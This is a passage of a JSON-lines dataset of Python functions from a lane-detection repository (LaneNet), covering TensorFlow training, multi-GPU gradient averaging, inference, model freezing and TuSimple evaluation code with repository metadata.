val_epoch_losses\n            )\n        )\nif self._enable_miou:\n    LOG.info('Best model\\'s val mious are: {}'.format(best_model))\nLOG.info('Complete training process good luck!!')\n\nreturn", "path": "lanenet-lane-detection/trainner/tusimple_lanenet_multi_gpu_trainner.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:param binary_seg_logits:\n:param instance_seg_logits:\n:param name:\n:param reuse:\n:return:\n\"\"\"\n", "func_signal": "def inference(self, binary_seg_logits, instance_seg_logits, name, reuse):\n", "code": "with tf.variable_scope(name_or_scope=name, reuse=reuse):\n\n    with tf.variable_scope(name_or_scope='binary_seg'):\n        binary_seg_score = tf.nn.softmax(logits=binary_seg_logits)\n        binary_seg_prediction = tf.argmax(binary_seg_score, axis=-1)\n\n    with tf.variable_scope(name_or_scope='instance_seg'):\n\n        pix_bn = self.layerbn(\n            inputdata=instance_seg_logits, is_training=self._is_training, name='pix_bn')\n        pix_relu = self.relu(inputdata=pix_bn, name='pix_relu')\n        instance_seg_prediction = self.conv2d(\n            inputdata=pix_relu,\n            out_channel=self._embedding_dims,\n            kernel_size=1,\n            use_bias=False,\n            name='pix_embedding_conv'\n        )\n\nreturn binary_seg_prediction, instance_seg_prediction", "path": "lanenet-lane-detection/lanenet_model/lanenet_back_end.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"Calculate the average gradient for each shared variable across all towers.\nNote that this function provides a synchronization point across all towers.\nArgs:\n  tower_grads: List of lists of (gradient, variable) tuples. The outer list\n    is over individual gradients. The inner list is over the gradient\n    calculation for each tower.\nReturns:\n   List of pairs of (gradient, variable) where the gradient has been averaged\n   across all towers.\n\"\"\"\n", "func_signal": "def _average_gradients(tower_grads):\n", "code": "average_grads = []\nfor grad_and_vars in zip(*tower_grads):\n    # Note that each grad_and_vars looks like the following:\n    #   ((grad0_gpu0, var0_gpu0), ... , (grad0_gpuN, var0_gpuN))\n    grads = []\n    for g, _ in grad_and_vars:\n        # Add 0 dimension to the gradients to represent the tower.\n        expanded_g = tf.expand_dims(g, 0)\n\n        # Append on a 'tower' dimension which we will average over below.\n        grads.append(expanded_g)\n\n    # Average over the 'tower' dimension.\n    grad = tf.concat(grads, 0)\n    grad = tf.reduce_mean(grad, 0)\n\n    # Keep in mind that the Variables are redundant because they are shared\n    # across towers. So .. we will just return the first tower's pointer to\n    # the Variable.\n    v = grad_and_vars[0][1]\n    grad_and_var = (grad, v)\n    average_grads.append(grad_and_var)\n\nreturn average_grads", "path": "lanenet-lane-detection/trainner/tusimple_lanenet_multi_gpu_trainner.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\ninitialize lanenet trainner\n\"\"\"\n", "func_signal": "def __init__(self, cfg):\n", "code": "self._cfg = cfg\n# define solver params and dataset\nself._train_dataset = lanenet_data_feed_pipline.LaneNetDataFeeder(flags='train')\nself._steps_per_epoch = len(self._train_dataset)\n\nself._model_name = '{:s}_{:s}'.format(self._cfg.MODEL.FRONT_END, self._cfg.MODEL.MODEL_NAME)\n\nself._train_epoch_nums = self._cfg.TRAIN.EPOCH_NUMS\nself._batch_size = self._cfg.TRAIN.BATCH_SIZE\nself._snapshot_epoch = self._cfg.TRAIN.SNAPSHOT_EPOCH\nself._model_save_dir = ops.join(self._cfg.TRAIN.MODEL_SAVE_DIR, self._model_name)\nself._tboard_save_dir = ops.join(self._cfg.TRAIN.TBOARD_SAVE_DIR, self._model_name)\nself._enable_miou = self._cfg.TRAIN.COMPUTE_MIOU.ENABLE\nif self._enable_miou:\n    self._record_miou_epoch = self._cfg.TRAIN.COMPUTE_MIOU.EPOCH\nself._input_tensor_size = [int(tmp) for tmp in self._cfg.AUG.TRAIN_CROP_SIZE]\n\nself._init_learning_rate = self._cfg.SOLVER.LR\nself._moving_ave_decay = self._cfg.SOLVER.MOVING_AVE_DECAY\nself._momentum = self._cfg.SOLVER.MOMENTUM\nself._lr_polynimal_decay_power = self._cfg.SOLVER.LR_POLYNOMIAL_POWER\nself._optimizer_mode = self._cfg.SOLVER.OPTIMIZER.lower()\n\nif self._cfg.TRAIN.RESTORE_FROM_SNAPSHOT.ENABLE:\n    self._initial_weight = self._cfg.TRAIN.RESTORE_FROM_SNAPSHOT.SNAPSHOT_PATH\nelse:\n    self._initial_weight = None\nif self._cfg.TRAIN.WARM_UP.ENABLE:\n    self._warmup_epoches = self._cfg.TRAIN.WARM_UP.EPOCH_NUMS\n    self._warmup_init_learning_rate = self._init_learning_rate / 1000.0\nelse:\n    self._warmup_epoches = 0\n\n# define tensorflow session\nsess_config = tf.ConfigProto(allow_soft_placement=True)\nsess_config.gpu_options.per_process_gpu_memory_fraction = self._cfg.GPU.GPU_MEMORY_FRACTION\nsess_config.gpu_options.allow_growth = self._cfg.GPU.TF_ALLOW_GROWTH\nsess_config.gpu_options.allocator_type = 'BFC'\nself._sess = tf.Session(config=sess_config)\n\n# define graph input tensor\nwith tf.variable_scope(name_or_scope='graph_input_node'):\n    self._input_src_image, self._input_binary_label_image, self._input_instance_label_image = \\\n        self._train_dataset.next_batch(batch_size=self._batch_size)\n\n# define model loss\nself._model = lanenet.LaneNet(phase='train', cfg=self._cfg)\nloss_set = self._model.compute_loss(\n    input_tensor=self._input_src_image,\n    binary_label=self._input_binary_label_image,\n    instance_label=self._input_instance_label_image,\n    name='LaneNet',\n    reuse=False\n)\nself._binary_prediciton, self._instance_prediction = self._model.inference(\n    input_tensor=self._input_src_image,\n    name='LaneNet',\n    reuse=True\n)\n\nself._loss = loss_set['total_loss']\nself._binary_seg_loss = loss_set['binary_seg_loss']\nself._disc_loss = loss_set['discriminative_loss']\nself._pix_embedding = loss_set['instance_seg_logits']\nself._binary_prediciton = tf.identity(self._binary_prediciton, name='binary_segmentation_result')\n\n# define miou\nif self._enable_miou:\n    with tf.variable_scope('miou'):\n        pred = tf.reshape(self._binary_prediciton, [-1, ])\n        gt = tf.reshape(self._input_binary_label_image, [-1, ])\n        indices = tf.squeeze(tf.where(tf.less_equal(gt, self._cfg.DATASET.NUM_CLASSES - 1)), 1)\n        gt = tf.gather(gt, indices)\n        pred = tf.gather(pred, indices)\n        self._miou, self._miou_update_op = tf.metrics.mean_iou(\n            labels=gt,\n            predictions=pred,\n            num_classes=self._cfg.DATASET.NUM_CLASSES\n        )\n\n# define learning rate\nwith tf.variable_scope('learning_rate'):\n    self._global_step = tf.Variable(1.0, dtype=tf.float32, trainable=False, name='global_step')\n    warmup_steps = tf.constant(\n        self._warmup_epoches * self._steps_per_epoch, dtype=tf.float32, name='warmup_steps'\n    )\n    train_steps = tf.constant(\n        self._train_epoch_nums * self._steps_per_epoch, dtype=tf.float32, name='train_steps'\n    )\n    self._learn_rate = tf.cond(\n        pred=self._global_step < warmup_steps,\n        true_fn=lambda: self._compute_warmup_lr(warmup_steps=warmup_steps, name='warmup_lr'),\n        false_fn=lambda: tf.train.polynomial_decay(\n            learning_rate=self._init_learning_rate,\n            global_step=self._global_step,\n            decay_steps=train_steps,\n            end_learning_rate=0.000001,\n            power=self._lr_polynimal_decay_power)\n    )\n    self._learn_rate = tf.identity(self._learn_rate, 'lr')\n    global_step_update = tf.assign_add(self._global_step, 1.0)\n\n# define moving average op\nwith tf.variable_scope(name_or_scope='moving_avg'):\n    if self._cfg.TRAIN.FREEZE_BN.ENABLE:\n        train_var_list = [\n            v for v in tf.trainable_variables() if 'beta' not in v.name and 'gamma' not in v.name\n        ]\n    else:\n        train_var_list = tf.trainable_variables()\n    moving_ave_op = tf.train.ExponentialMovingAverage(\n        self._moving_ave_decay).apply(train_var_list + tf.moving_average_variables())\n    # define saver\n    self._loader = tf.train.Saver(tf.moving_average_variables())\n\n# define training op\nwith tf.variable_scope(name_or_scope='train_step'):\n    if self._cfg.TRAIN.FREEZE_BN.ENABLE:\n        train_var_list = [\n            v for v in tf.trainable_variables() if 'beta' not in v.name and 'gamma' not in v.name\n        ]\n    else:\n        train_var_list = tf.trainable_variables()\n    if self._optimizer_mode == 'sgd':\n        optimizer = tf.train.MomentumOptimizer(\n            learning_rate=self._learn_rate,\n            momentum=self._momentum\n        )\n    elif self._optimizer_mode == 'adam':\n        optimizer = tf.train.AdamOptimizer(\n            learning_rate=self._learn_rate,\n        )\n    else:\n        raise ValueError('Not support optimizer: {:s}'.format(self._optimizer_mode))\n    optimize_op = optimizer.minimize(self._loss, var_list=train_var_list)\n    with tf.control_dependencies(tf.get_collection(tf.GraphKeys.UPDATE_OPS)):\n        with tf.control_dependencies([optimize_op, global_step_update]):\n            with tf.control_dependencies([moving_ave_op]):\n                self._train_op = tf.no_op()\n\n# define saver and loader\nwith tf.variable_scope('loader_and_saver'):\n    self._net_var = [vv for vv in tf.global_variables() if 'lr' not in vv.name]\n    self._saver = tf.train.Saver(tf.global_variables(), max_to_keep=5)\n\n# define summary\nwith tf.variable_scope('summary'):\n    summary_merge_list = [\n        tf.summary.scalar('learn_rate', self._learn_rate),\n        tf.summary.scalar('total_loss', self._loss),\n        tf.summary.scalar('binary_seg_loss', self._binary_seg_loss),\n        tf.summary.scalar('discriminative_loss', self._disc_loss),\n    ]\n    if self._enable_miou:\n        with tf.control_dependencies([self._miou_update_op]):\n            summary_merge_list_with_miou = [\n                tf.summary.scalar('learn_rate', self._learn_rate),\n                tf.summary.scalar('total_loss', self._loss),\n                tf.summary.scalar('binary_seg_loss', self._binary_seg_loss),\n                tf.summary.scalar('discriminative_loss', self._disc_loss),\n                tf.summary.scalar('miou', self._miou)\n            ]\n            self._write_summary_op_with_miou = tf.summary.merge(summary_merge_list_with_miou)\n    if ops.exists(self._tboard_save_dir):\n        shutil.rmtree(self._tboard_save_dir)\n    os.makedirs(self._tboard_save_dir, exist_ok=True)\n    model_params_file_save_path = ops.join(self._tboard_save_dir, self._cfg.TRAIN.MODEL_PARAMS_CONFIG_FILE_NAME)\n    with open(model_params_file_save_path, 'w', encoding='utf-8') as f_obj:\n        self._cfg.dump_to_json_file(f_obj)\n    self._write_summary_op = tf.summary.merge(summary_merge_list)\n    self._summary_writer = tf.summary.FileWriter(self._tboard_save_dir, graph=self._sess.graph)\n\nLOG.info('Initialize tusimple lanenet trainner complete')", "path": "lanenet-lane-detection/trainner/tusimple_lanenet_single_gpu_trainner.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\ninit lanenet backend\n:param phase: train or test\n\"\"\"\n", "func_signal": "def __init__(self, phase, cfg):\n", "code": "super(LaneNetBackEnd, self).__init__()\nself._cfg = cfg\nself._phase = phase\nself._is_training = self._is_net_for_training()\n\nself._class_nums = self._cfg.DATASET.NUM_CLASSES\nself._embedding_dims = self._cfg.MODEL.EMBEDDING_FEATS_DIMS\nself._binary_loss_type = self._cfg.SOLVER.LOSS_TYPE", "path": "lanenet-lane-detection/lanenet_model/lanenet_back_end.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:param ckpt_file_path:\n:param pb_file_path:\n:return:\n\"\"\"\n# construct compute graph\n", "func_signal": "def convert_ckpt_into_pb_file(ckpt_file_path, pb_file_path):\n", "code": "with tf.variable_scope('lanenet'):\n    input_tensor = tf.placeholder(dtype=tf.float32, shape=[1, 256, 512, 3], name='input_tensor')\n\nnet = lanenet.LaneNet(phase='test', cfg=CFG)\nbinary_seg_ret, instance_seg_ret = net.inference(input_tensor=input_tensor, name='LaneNet')\n\nwith tf.variable_scope('lanenet/'):\n    binary_seg_ret = tf.cast(binary_seg_ret, dtype=tf.float32)\n    binary_seg_ret = tf.squeeze(binary_seg_ret, axis=0, name='final_binary_output')\n    instance_seg_ret = tf.squeeze(instance_seg_ret, axis=0, name='final_pixel_embedding_output')\n\n# define moving average version of the learned variables for eval\nwith tf.variable_scope(name_or_scope='moving_avg'):\n    variable_averages = tf.train.ExponentialMovingAverage(\n        CFG.SOLVER.MOVING_AVE_DECAY)\n    variables_to_restore = variable_averages.variables_to_restore()\n\n# create a session\nsaver = tf.train.Saver(variables_to_restore)\n\nsess_config = tf.ConfigProto()\nsess_config.gpu_options.per_process_gpu_memory_fraction = 0.85\nsess_config.gpu_options.allow_growth = False\nsess_config.gpu_options.allocator_type = 'BFC'\n\nsess = tf.Session(config=sess_config)\n\nwith sess.as_default():\n    saver.restore(sess, ckpt_file_path)\n\n    converted_graph_def = tf.graph_util.convert_variables_to_constants(\n        sess,\n        input_graph_def=sess.graph.as_graph_def(),\n        output_node_names=[\n            'lanenet/input_tensor',\n            'lanenet/final_binary_output',\n            'lanenet/final_pixel_embedding_output'\n        ]\n    )\n\n    with tf.gfile.GFile(pb_file_path, \"wb\") as f:\n        f.write(converted_graph_def.SerializeToString())", "path": "lanenet-lane-detection/mnn_project/freeze_lanenet_model.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:return:\n\"\"\"\n", "func_signal": "def _vgg16_fcn_decode(self, name):\n", "code": "with tf.variable_scope(name):\n\n    # decode part for binary segmentation\n    with tf.variable_scope(name_or_scope='binary_seg_decode'):\n\n        decode_stage_5_binary = self._net_intermediate_results['encode_stage_5_binary']['data']\n\n        decode_stage_4_fuse = self._decode_block(\n            input_tensor=decode_stage_5_binary,\n            previous_feats_tensor=self._net_intermediate_results['encode_stage_4_share']['data'],\n            name='decode_stage_4_fuse', out_channels_nums=512, previous_kernel_size=3\n        )\n        decode_stage_3_fuse = self._decode_block(\n            input_tensor=decode_stage_4_fuse,\n            previous_feats_tensor=self._net_intermediate_results['encode_stage_3_share']['data'],\n            name='decode_stage_3_fuse', out_channels_nums=256\n        )\n        decode_stage_2_fuse = self._decode_block(\n            input_tensor=decode_stage_3_fuse,\n            previous_feats_tensor=self._net_intermediate_results['encode_stage_2_share']['data'],\n            name='decode_stage_2_fuse', out_channels_nums=128\n        )\n        decode_stage_1_fuse = self._decode_block(\n            input_tensor=decode_stage_2_fuse,\n            previous_feats_tensor=self._net_intermediate_results['encode_stage_1_share']['data'],\n            name='decode_stage_1_fuse', out_channels_nums=64\n        )\n        binary_final_logits_conv_weights_stddev = tf.sqrt(\n            tf.divide(tf.constant(2.0, tf.float32),\n                      tf.multiply(4.0 * 4.0,\n                                  tf.cast(tf.shape(decode_stage_1_fuse)[3], tf.float32)))\n        )\n        binary_final_logits_conv_weights_init = tf.truncated_normal_initializer(\n            mean=0.0, stddev=binary_final_logits_conv_weights_stddev)\n\n        binary_final_logits = self.conv2d(\n            inputdata=decode_stage_1_fuse,\n            out_channel=self._class_nums,\n            kernel_size=1, use_bias=False,\n            w_init=binary_final_logits_conv_weights_init,\n            name='binary_final_logits'\n        )\n\n        self._net_intermediate_results['binary_segment_logits'] = {\n            'data': binary_final_logits,\n            'shape': binary_final_logits.get_shape().as_list()\n        }\n\n    with tf.variable_scope(name_or_scope='instance_seg_decode'):\n\n        decode_stage_5_instance = self._net_intermediate_results['encode_stage_5_instance']['data']\n\n        decode_stage_4_fuse = self._decode_block(\n            input_tensor=decode_stage_5_instance,\n            previous_feats_tensor=self._net_intermediate_results['encode_stage_4_share']['data'],\n            name='decode_stage_4_fuse', out_channels_nums=512, previous_kernel_size=3)\n\n        decode_stage_3_fuse = self._decode_block(\n            input_tensor=decode_stage_4_fuse,\n            previous_feats_tensor=self._net_intermediate_results['encode_stage_3_share']['data'],\n            name='decode_stage_3_fuse', out_channels_nums=256)\n\n        decode_stage_2_fuse = self._decode_block(\n            input_tensor=decode_stage_3_fuse,\n            previous_feats_tensor=self._net_intermediate_results['encode_stage_2_share']['data'],\n            name='decode_stage_2_fuse', out_channels_nums=128)\n\n        decode_stage_1_fuse = self._decode_block(\n            input_tensor=decode_stage_2_fuse,\n            previous_feats_tensor=self._net_intermediate_results['encode_stage_1_share']['data'],\n            name='decode_stage_1_fuse', out_channels_nums=64, need_activate=False)\n\n        self._net_intermediate_results['instance_segment_logits'] = {\n            'data': decode_stage_1_fuse,\n            'shape': decode_stage_1_fuse.get_shape().as_list()\n        }", "path": "lanenet-lane-detection/semantic_segmentation_zoo/vgg16_based_fcn.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:return:\n\"\"\"\n", "func_signal": "def init_args():\n", "code": "parser = argparse.ArgumentParser()\nparser.add_argument('-w', '--weights_path', default=MODEL_WEIGHTS_FILE_PATH)\nparser.add_argument('-s', '--save_path', default=OUTPUT_PB_FILE_PATH)\n\nreturn parser.parse_args()", "path": "lanenet-lane-detection/mnn_project/freeze_lanenet_model.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:param src_dir:\n:param weights_path:\n:param save_dir:\n:return:\n\"\"\"\n", "func_signal": "def eval_lanenet(src_dir, weights_path, save_dir):\n", "code": "assert ops.exists(src_dir), '{:s} not exist'.format(src_dir)\n\nos.makedirs(save_dir, exist_ok=True)\n\ninput_tensor = tf.placeholder(dtype=tf.float32, shape=[1, 256, 512, 3], name='input_tensor')\n\nnet = lanenet.LaneNet(phase='test', cfg=CFG)\nbinary_seg_ret, instance_seg_ret = net.inference(input_tensor=input_tensor, name='LaneNet')\n\npostprocessor = lanenet_postprocess.LaneNetPostProcessor(cfg=CFG)\n\nsaver = tf.train.Saver()\n\n# Set sess configuration\nsess_config = tf.ConfigProto()\nsess_config.gpu_options.per_process_gpu_memory_fraction = CFG.GPU.GPU_MEMORY_FRACTION\nsess_config.gpu_options.allow_growth = CFG.GPU.TF_ALLOW_GROWTH\nsess_config.gpu_options.allocator_type = 'BFC'\n\nsess = tf.Session(config=sess_config)\n\nwith sess.as_default():\n\n    saver.restore(sess=sess, save_path=weights_path)\n\n    image_list = glob.glob('{:s}/**/*.jpg'.format(src_dir), recursive=True)\n    avg_time_cost = []\n    for index, image_path in tqdm.tqdm(enumerate(image_list), total=len(image_list)):\n\n        image = cv2.imread(image_path, cv2.IMREAD_COLOR)\n        image_vis = image\n        image = cv2.resize(image, (512, 256), interpolation=cv2.INTER_LINEAR)\n        image = image / 127.5 - 1.0\n\n        t_start = time.time()\n        binary_seg_image, instance_seg_image = sess.run(\n            [binary_seg_ret, instance_seg_ret],\n            feed_dict={input_tensor: [image]}\n        )\n        avg_time_cost.append(time.time() - t_start)\n\n        postprocess_result = postprocessor.postprocess(\n            binary_seg_result=binary_seg_image[0],\n            instance_seg_result=instance_seg_image[0],\n            source_image=image_vis\n        )\n\n        if index % 100 == 0:\n            LOG.info('Mean inference time every single image: {:.5f}s'.format(np.mean(avg_time_cost)))\n            avg_time_cost.clear()\n\n        input_image_dir = ops.split(image_path.split('clips')[1])[0][1:]\n        input_image_name = ops.split(image_path)[1]\n        output_image_dir = ops.join(save_dir, input_image_dir)\n        os.makedirs(output_image_dir, exist_ok=True)\n        output_image_path = ops.join(output_image_dir, input_image_name)\n        if ops.exists(output_image_path):\n            continue\n\n        cv2.imwrite(output_image_path, postprocess_result['source_image'])\n\nreturn", "path": "lanenet-lane-detection/tools/evaluate_lanenet_on_tusimple.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:return:\n\"\"\"\n", "func_signal": "def train(self):\n", "code": "self._sess.run(tf.global_variables_initializer())\nself._sess.run(tf.local_variables_initializer())\nif self._cfg.TRAIN.RESTORE_FROM_SNAPSHOT.ENABLE:\n    try:\n        LOG.info('=> Restoring weights from: {:s} ... '.format(self._initial_weight))\n        self._loader.restore(self._sess, self._initial_weight)\n        global_step_value = self._sess.run(self._global_step)\n        remain_epoch_nums = self._train_epoch_nums - math.floor(global_step_value / self._steps_per_epoch)\n        epoch_start_pt = self._train_epoch_nums - remain_epoch_nums\n    except OSError as e:\n        LOG.error(e)\n        LOG.info('=> {:s} does not exist !!!'.format(self._initial_weight))\n        LOG.info('=> Now it starts to train LaneNet from scratch ...')\n        epoch_start_pt = 1\n    except Exception as e:\n        LOG.error(e)\n        LOG.info('=> Can not load pretrained model weights: {:s}'.format(self._initial_weight))\n        LOG.info('=> Now it starts to train LaneNet from scratch ...')\n        epoch_start_pt = 1\nelse:\n    LOG.info('=> Starts to train LaneNet from scratch ...')\n    epoch_start_pt = 1\n\nfor epoch in range(epoch_start_pt, self._train_epoch_nums):\n    train_epoch_losses = []\n    train_epoch_mious = []\n    traindataset_pbar = tqdm.tqdm(range(1, self._steps_per_epoch))\n\n    for _ in traindataset_pbar:\n\n        if self._enable_miou and epoch % self._record_miou_epoch == 0:\n            _, _, summary, train_step_loss, train_step_binary_loss, \\\n                train_step_instance_loss, global_step_val = \\\n                self._sess.run(\n                    fetches=[\n                        self._train_op, self._miou_update_op,\n                        self._write_summary_op_with_miou,\n                        self._loss, self._binary_seg_loss, self._disc_loss,\n                        self._global_step\n                    ]\n                )\n            train_step_miou = self._sess.run(\n                fetches=self._miou\n            )\n            train_epoch_losses.append(train_step_loss)\n            train_epoch_mious.append(train_step_miou)\n            self._summary_writer.add_summary(summary, global_step=global_step_val)\n            traindataset_pbar.set_description(\n                'train loss: {:.5f}, b_loss: {:.5f}, i_loss: {:.5f}, miou: {:.5f}'.format(\n                    train_step_loss, train_step_binary_loss, train_step_instance_loss, train_step_miou\n                )\n            )\n        else:\n            _, summary, train_step_loss, train_step_binary_loss, \\\n                train_step_instance_loss, global_step_val = self._sess.run(\n                    fetches=[\n                        self._train_op, self._write_summary_op,\n                        self._loss, self._binary_seg_loss, self._disc_loss,\n                        self._global_step\n                    ]\n            )\n            train_epoch_losses.append(train_step_loss)\n            self._summary_writer.add_summary(summary, global_step=global_step_val)\n            traindataset_pbar.set_description(\n                'train loss: {:.5f}, b_loss: {:.5f}, i_loss: {:.5f}'.format(\n                    train_step_loss, train_step_binary_loss, train_step_instance_loss\n                )\n            )\n\n    train_epoch_losses = np.mean(train_epoch_losses)\n    if self._enable_miou and epoch % self._record_miou_epoch == 0:\n        train_epoch_mious = np.mean(train_epoch_mious)\n\n    if epoch % self._snapshot_epoch == 0:\n        if self._enable_miou:\n            snapshot_model_name = 'tusimple_train_miou={:.4f}.ckpt'.format(train_epoch_mious)\n            snapshot_model_path = ops.join(self._model_save_dir, snapshot_model_name)\n            os.makedirs(self._model_save_dir, exist_ok=True)\n            self._saver.save(self._sess, snapshot_model_path, global_step=epoch)\n        else:\n            snapshot_model_name = 'tusimple_train_loss={:.4f}.ckpt'.format(train_epoch_losses)\n            snapshot_model_path = ops.join(self._model_save_dir, snapshot_model_name)\n            os.makedirs(self._model_save_dir, exist_ok=True)\n            self._saver.save(self._sess, snapshot_model_path, global_step=epoch)\n\n    log_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))\n    if self._enable_miou and epoch % self._record_miou_epoch == 0:\n        LOG.info(\n            '=> Epoch: {:d} Time: {:s} Train loss: {:.5f} '\n            'Train miou: {:.5f} ...'.format(\n                epoch, log_time,\n                train_epoch_losses,\n                train_epoch_mious,\n            )\n        )\n    else:\n        LOG.info(\n            '=> Epoch: {:d} Time: {:s} Train loss: {:.5f} ...'.format(\n                epoch, log_time,\n                train_epoch_losses,\n            )\n        )\nLOG.info('Complete training process good luck!!')\n\nreturn", "path": "lanenet-lane-detection/trainner/tusimple_lanenet_single_gpu_trainner.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\nif the net is used for training or not\n:return:\n\"\"\"\n", "func_signal": "def _is_net_for_training(self):\n", "code": "if isinstance(self._phase, tf.Tensor):\n    phase = self._phase\nelse:\n    phase = tf.constant(self._phase, dtype=tf.string)\n\nreturn tf.equal(phase, tf.constant('train', dtype=tf.string))", "path": "lanenet-lane-detection/lanenet_model/lanenet_back_end.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\ninitialize lanenet multi gpu trainner\n\"\"\"\n", "func_signal": "def __init__(self, cfg):\n", "code": "self._cfg = cfg\n# define solver params and dataset\nself._train_dataset = lanenet_data_feed_pipline.LaneNetDataFeeder(flags='train')\nself._val_dataset = lanenet_data_feed_pipline.LaneNetDataFeeder(flags='val')\nself._steps_per_epoch = len(self._train_dataset)\nself._val_steps_per_epoch = len(self._val_dataset)\n\nself._model_name = '{:s}_{:s}'.format(self._cfg.MODEL.FRONT_END, self._cfg.MODEL.MODEL_NAME)\n\nself._train_epoch_nums = self._cfg.TRAIN.EPOCH_NUMS\nself._batch_size = self._cfg.TRAIN.BATCH_SIZE\nself._val_batch_size = self._cfg.TRAIN.VAL_BATCH_SIZE\nself._snapshot_epoch = self._cfg.TRAIN.SNAPSHOT_EPOCH\nself._model_save_dir = ops.join(self._cfg.TRAIN.MODEL_SAVE_DIR, self._model_name)\nself._tboard_save_dir = ops.join(self._cfg.TRAIN.TBOARD_SAVE_DIR, self._model_name)\nself._enable_miou = self._cfg.TRAIN.COMPUTE_MIOU.ENABLE\nif self._enable_miou:\n    self._record_miou_epoch = self._cfg.TRAIN.COMPUTE_MIOU.EPOCH\nself._input_tensor_size = [int(tmp) for tmp in self._cfg.AUG.TRAIN_CROP_SIZE]\nself._gpu_devices = self._cfg.TRAIN.MULTI_GPU.GPU_DEVICES\nself._gpu_nums = len(self._gpu_devices)\nself._chief_gpu_index = self._cfg.TRAIN.MULTI_GPU.CHIEF_DEVICE_INDEX\nself._batch_size_per_gpu = int(self._batch_size / self._gpu_nums)\n\nself._init_learning_rate = self._cfg.SOLVER.LR\nself._moving_ave_decay = self._cfg.SOLVER.MOVING_AVE_DECAY\nself._momentum = self._cfg.SOLVER.MOMENTUM\nself._lr_polynimal_decay_power = self._cfg.SOLVER.LR_POLYNOMIAL_POWER\nself._optimizer_mode = self._cfg.SOLVER.OPTIMIZER.lower()\n\nif self._cfg.TRAIN.RESTORE_FROM_SNAPSHOT.ENABLE:\n    self._initial_weight = self._cfg.TRAIN.RESTORE_FROM_SNAPSHOT.SNAPSHOT_PATH\nelse:\n    self._initial_weight = None\nif self._cfg.TRAIN.WARM_UP.ENABLE:\n    self._warmup_epoches = self._cfg.TRAIN.WARM_UP.EPOCH_NUMS\n    self._warmup_init_learning_rate = self._init_learning_rate / 1000.0\nelse:\n    self._warmup_epoches = 0\n\n# define tensorflow session\nsess_config = tf.ConfigProto(allow_soft_placement=True)\nsess_config.gpu_options.per_process_gpu_memory_fraction = self._cfg.GPU.GPU_MEMORY_FRACTION\nsess_config.gpu_options.allow_growth = self._cfg.GPU.TF_ALLOW_GROWTH\nsess_config.gpu_options.allocator_type = 'BFC'\nself._sess = tf.Session(config=sess_config)\n\n# define graph input tensor\nwith tf.variable_scope(name_or_scope='graph_input_node'):\n    self._input_src_image_list = []\n    self._input_binary_label_image_list = []\n    self._input_instance_label_image_list = []\n    for i in range(self._gpu_nums):\n        src_imgs, binary_label_imgs, instance_label_imgs = self._train_dataset.next_batch(\n            batch_size=self._batch_size_per_gpu\n        )\n        self._input_src_image_list.append(src_imgs)\n        self._input_binary_label_image_list.append(binary_label_imgs)\n        self._input_instance_label_image_list.append(instance_label_imgs)\n    self._val_input_src_image, self._val_input_binary_label_image, self._val_input_instance_label_image = \\\n        self._val_dataset.next_batch(batch_size=self._val_batch_size)\n\n# define model\nself._model = lanenet.LaneNet(phase='train', cfg=self._cfg)\nself._val_model = lanenet.LaneNet(phase='test', cfg=self._cfg)\n\n# define average container\ntower_grads = []\ntower_total_loss = []\ntower_binary_seg_loss = []\ntower_instance_seg_loss = []\nbatchnorm_updates = None\n\n# define learning rate\nwith tf.variable_scope('learning_rate'):\n    self._global_step = tf.Variable(1.0, dtype=tf.float32, trainable=False, name='global_step')\n    self._val_global_step = tf.Variable(1.0, dtype=tf.float32, trainable=False, name='val_global_step')\n    self._val_global_step_update = tf.assign_add(self._val_global_step, 1.0)\n    warmup_steps = tf.constant(\n        self._warmup_epoches * self._steps_per_epoch, dtype=tf.float32, name='warmup_steps'\n    )\n    train_steps = tf.constant(\n        self._train_epoch_nums * self._steps_per_epoch, dtype=tf.float32, name='train_steps'\n    )\n    self._learn_rate = tf.cond(\n        pred=self._global_step < warmup_steps,\n        true_fn=lambda: self._compute_warmup_lr(warmup_steps=warmup_steps, name='warmup_lr'),\n        false_fn=lambda: tf.train.polynomial_decay(\n            learning_rate=self._init_learning_rate,\n            global_step=self._global_step,\n            decay_steps=train_steps,\n            end_learning_rate=0.000000001,\n            power=self._lr_polynimal_decay_power)\n    )\n    self._learn_rate = tf.identity(self._learn_rate, 'lr')\n\n# define optimizer\nif self._optimizer_mode == 'sgd':\n    optimizer = tf.train.MomentumOptimizer(\n        learning_rate=self._learn_rate,\n        momentum=self._momentum\n    )\nelif self._optimizer_mode == 'adam':\n    optimizer = 